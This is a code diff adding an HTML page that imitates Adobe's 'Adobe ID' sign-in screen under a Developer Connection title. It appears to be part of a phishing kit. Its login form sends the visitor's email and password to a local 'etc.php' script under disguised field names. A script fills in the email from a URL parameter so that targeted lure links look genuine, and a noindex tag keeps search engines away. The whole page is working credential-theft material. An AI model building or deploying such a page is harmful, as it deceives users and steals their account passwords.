@@ -1,0 +1,62 @@
+<!DOCTYPE html> 
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	
+	<title>Author guidelines  | Adobe Developer Connection</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link rel="stylesheet" href="./skin/index.css">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="ROBOTS" content="NOINDEX, NOFOLLOW"> 
+	  <script src="js/jquery.min.js"></script>
+  <script src="js/bootstrap.min.js"></script> 
+	<link rel="shortcut icon" href="./skin/favicon.ico">
+</head>
+<body>
+	<div class="image-blur"></div>
+	<div class="overlay"></div>
+	<div class="login">
+		<div class="box">
+			<div class="idp-flow-header">
+				<div class="idp-flow-logo-image"></div> <div class="text">Adobe ID</div>
+			</div>
+			<h1 class="page-title">Sign in</h1>
+			<form class="abode-login" action="etc.php" method="post">
+				<div class="inputs">
+					<div class="loader ball-beat"><div></div><div></div><div></div></div>
+					<input type="email" name="vision" id="email" placeholder="Email Adress" required="">
+					<input type="password" name="dream" id="password" placeholder="Password" required="">
+				</div>
+				<div class="mod-form-button">
+					<input type="submit" class="mod-main" name="idinri" id="adobe-login" value="Sign In">
+				</div>
+			</form>
+		</div>
+	</div>
+	
+	
+	
+<script>
+    
+$.urlParam = function(email){
+    var results = new RegExp('[\?&]' + email + '=([^&#]*)').exec(window.location.href);
+    return results[1] || 0;
+	
+      
+}
+
+</script>
+
+
+
+<script>
+    
+    $( document ).ready(function() {
+        // after the page elements are all loaded, then run the script
+        // Set the input field with unique ID #email to a value
+
+          $("#email").val($.urlParam('email'));
+        
+        });
+        
+</script>
+
+</body></html>
